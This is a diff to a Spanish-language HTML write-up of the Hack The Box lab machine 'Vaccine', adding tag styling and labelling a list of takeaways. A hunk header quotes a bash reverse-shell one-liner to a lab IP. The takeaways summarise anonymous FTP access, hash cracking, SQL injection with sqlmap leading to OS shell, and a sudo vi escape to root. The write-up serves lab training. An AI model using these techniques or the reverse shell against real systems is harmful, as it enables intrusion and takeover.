@@ -129,6 +129,11 @@
   .takeaways li{background:var(--panel);border:1px solid var(--line);border-left:4px solid var(--green);
     padding:11px 14px;margin:0 0 9px;font-size:14.5px;line-height:1.55;}
   .takeaways li b{color:var(--green);}
+  .tk{display:inline-block;font-family:'IBM Plex Mono';font-weight:700;font-size:8.5px;letter-spacing:.06em;padding:2px 6px;margin-right:9px;border:1px solid;vertical-align:2px;white-space:nowrap;}
+  .tk-gen{color:var(--green);border-color:var(--green);}
+  .tk-lab{color:var(--amber);border-color:var(--amber);}
+  .tk-legend{font-size:13px;color:var(--dim);margin:0 0 16px;line-height:1.7;}
+  .tk-legend .tk{margin-right:5px;}
 
   footer{border-top:3px solid var(--line);margin-top:44px;padding:34px 22px 60px;text-align:center;
     font-family:'IBM Plex Mono';font-weight:600;font-size:11px;letter-spacing:.03em;color:var(--dim);line-height:2.4;}
@@ -213,7 +218,7 @@
     <pre>21/tcp open  ftp
 22/tcp open  ssh
 80/tcp open  http</pre>
-    <p class="f">Los mismos tres de Cap. <code class="ic">ttl=63</code> confirma Linux. SSH pide credenciales (cerrado por ahora), HTTP es la web. Pero antes de la web, el puerto <b>21 (FTP)</b> pide un chequeo obligatorio.</p>
+    <p class="f">Los mismos tres de Cap. <code class="ic">ttl=63</code> apunta a Linux (pista, no prueba). SSH pide credenciales (cerrado por ahora), HTTP es la web. Pero antes de la web, el puerto <b>21 (FTP)</b> pide un chequeo obligatorio.</p>
     <div class="why"><b>REFLEJO: FTP ABIERTO → PROBAR ANÓNIMO</b>Cuando veas el puerto 21, lo primero es comprobar si permite acceso <b>anónimo</b>: entrar con el usuario <code class="ic">anonymous</code> y cualquier contraseña. Es un chequeo de 20 segundos que en muchas máquinas abre la puerta antes de tocar nada más.</div>
   </div>
 </section>
@@ -401,17 +406,18 @@ bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.33/4444 0&gt;&amp;1'</pre>
   <div class="wrap">
     <div class="sec-head"><span class="sec-id">▚</span><h2 class="sec-name">CONCEPTOS NUEVOS (vs LA SERIE)</h2></div>
     <div class="sec-focus">Lo que Vaccine suma a Cap, Knife y Forest.</div>
+    <p class="tk-legend"><span class="tk tk-gen">GENERAL</span> principio transferible a otras máquinas. <span class="tk tk-lab">LAB</span> heurística o convención de laboratorio (HTB), no una regla universal.</p>
     <ul class="takeaways">
-      <li><b>FTP anónimo:</b> puerto 21 abierto = probar <code class="ic">anonymous</code> con contraseña vacía antes que nada.</li>
-      <li><b>Cracking de archivos protegidos:</b> la familia <code class="ic">*2john</code> (zip2john, ssh2john, pdf2john) convierte un archivo en un hash atacable.</li>
-      <li><b>Leer el código fuente:</b> los archivos de una web guardan hashes y credenciales (login, cadenas de conexión a la BD).</li>
-      <li><b>SQL injection:</b> confirmar a mano con una comilla (ver el error), luego explotar con <code class="ic">sqlmap</code> (cookie incluida).</li>
-      <li><b>RCE vía SQLi:</b> <code class="ic">--os-shell</code> cuando el usuario de la BD es DBA. La inyección da shell, no solo datos.</li>
-      <li><b>Estabilización de TTY:</b> <code class="ic">python3 -c pty</code> + <code class="ic">stty raw -echo; fg</code> para que <code class="ic">su</code>/<code class="ic">vi</code> no se caigan.</li>
-      <li><b>SSH &gt; reverse shell:</b> con credenciales válidas, entra por SSH y evita todo el problema del terminal.</li>
-      <li><b>sudo es literal:</b> solo el comando exacto de <code class="ic">sudo -l</code>; nada de argumentos extra.</li>
-      <li><b>vi/sudo (GTFOBins):</b> escape a root con <code class="ic">:!/bin/bash</code> desde dentro del editor.</li>
-      <li><b>Diagnostica lo tonto:</b> a veces el muro no es el exploit, es el layout del teclado (<code class="ic">setxkbmap</code>).</li>
+      <li><span class="tk tk-gen">GENERAL</span><b>FTP anónimo:</b> puerto 21 abierto = probar <code class="ic">anonymous</code> con contraseña vacía antes que nada.</li>
+      <li><span class="tk tk-gen">GENERAL</span><b>Cracking de archivos protegidos:</b> la familia <code class="ic">*2john</code> (zip2john, ssh2john, pdf2john) convierte un archivo en un hash atacable.</li>
+      <li><span class="tk tk-gen">GENERAL</span><b>Leer el código fuente:</b> los archivos de una web guardan hashes y credenciales (login, cadenas de conexión a la BD).</li>
+      <li><span class="tk tk-gen">GENERAL</span><b>SQL injection:</b> confirmar a mano con una comilla (ver el error), luego explotar con <code class="ic">sqlmap</code> (cookie incluida).</li>
+      <li><span class="tk tk-gen">GENERAL</span><b>RCE vía SQLi:</b> <code class="ic">--os-shell</code> cuando el usuario de la BD es DBA. La inyección da shell, no solo datos.</li>
+      <li><span class="tk tk-gen">GENERAL</span><b>Estabilización de TTY:</b> <code class="ic">python3 -c pty</code> + <code class="ic">stty raw -echo; fg</code> para que <code class="ic">su</code>/<code class="ic">vi</code> no se caigan.</li>
+      <li><span class="tk tk-gen">GENERAL</span><b>SSH &gt; reverse shell:</b> con credenciales válidas, entra por SSH y evita todo el problema del terminal.</li>
+      <li><span class="tk tk-gen">GENERAL</span><b>sudo es literal:</b> solo el comando exacto de <code class="ic">sudo -l</code>; nada de argumentos extra.</li>
+      <li><span class="tk tk-gen">GENERAL</span><b>vi/sudo (GTFOBins):</b> escape a root con <code class="ic">:!/bin/bash</code> desde dentro del editor.</li>
+      <li><span class="tk tk-gen">GENERAL</span><b>Diagnostica lo tonto:</b> a veces el muro no es el exploit, es el layout del teclado (<code class="ic">setxkbmap</code>).</li>
     </ul>
   </div>
 </section>
